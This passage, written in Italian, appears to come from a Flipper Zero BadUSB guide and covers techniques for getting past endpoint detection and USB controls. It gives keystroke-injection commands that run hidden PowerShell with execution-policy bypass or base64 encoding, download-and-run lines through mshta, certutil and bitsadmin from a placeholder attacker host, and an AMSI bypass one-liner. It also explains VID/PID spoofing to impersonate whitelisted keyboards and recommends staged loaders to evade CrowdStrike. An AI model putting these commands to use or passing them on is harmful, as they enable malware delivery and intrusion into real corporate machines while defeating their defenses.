## Tecniche di Evasione

### Evasione EDR/Antivirus

**Problema:** i moderni EDR (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint) possono rilevare comandi PowerShell sospetti anche se digitati da tastiera.

**Tecnica 1 - Obfuscation PowerShell:**
```
REM Invece di "powershell", usa abbreviazioni
STRING powershell -w h -ep byp -nop -c "..."
```

**Tecnica 2 - Encoding Base64:**
```
STRING powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA...
```
(Il payload codificato è meno rilevabile da firme statiche)

**Tecnica 3 - Living off the Land (LOLBins):**
Usa eseguibili legittimi di Windows per eseguire payload:
```
STRING mshta http://ATTACKER/payload.hta
STRING certutil -urlcache -split -f http://ATTACKER/payload.exe %TEMP%\svc.exe
STRING rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write(...)
STRING bitsadmin /transfer job http://ATTACKER/payload.exe %TEMP%\svc.exe
```

**Tecnica 4 - AMSI Bypass:**
```
STRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
(Disabilita AMSI per la sessione corrente - permette di eseguire script che altrimenti verrebbero bloccati)

**Tecnica 5 - VID/PID Spoofing:**
Modifica il VID/PID del Flipper per farlo apparire come una tastiera legittima:
- Logitech: VID 046D
- Microsoft: VID 045E
- Dell: VID 413C

### Evasione USB Device Control

**Problema:** alcuni ambienti enterprise bloccano dispositivi USB sconosciuti.

**Tecnica 1 - VID/PID di una tastiera già autorizzata:**
Se l'ambiente usa whitelist USB, il Flipper deve avere lo stesso VID/PID di una tastiera già autorizzata.

**Tecnica 2 - USB Armory / Network Adapter:**
Alcuni sistemi bloccano le tastiere USB ma permettono adattatori di rete. Il Flipper può emulare un adattatore Ethernet USB (RNDIS) per injection di traffico.

### Timing e Velocità

- **Macchine lente:** aumenta i delay (DEFAULT_DELAY 200-500)
- **Macchine veloci con SSD:** delay più bassi (DEFAULT_DELAY 50-100)
- **VM/RDP:** latenza aggiuntiva, servono delay molto generosi (500-1000ms)
- **WAIT_FOR_BUTTON_PRESS:** usa questo comando per aspettare il momento giusto prima di eseguire la parte critica del payload

> **Nota personale:** L'evasione è la parte più difficile. Un payload che funziona perfettamente in laboratorio può fallire miseramente su un PC aziendale con CrowdStrike. La tecnica che mi ha dato i risultati migliori è combinare LOLBins con payload staged: il BadUSB scarica solo un piccolo loader che a sua volta scarica il payload vero. Questo riduce la "firma" del comando iniziale e rende più difficile la detection.

---

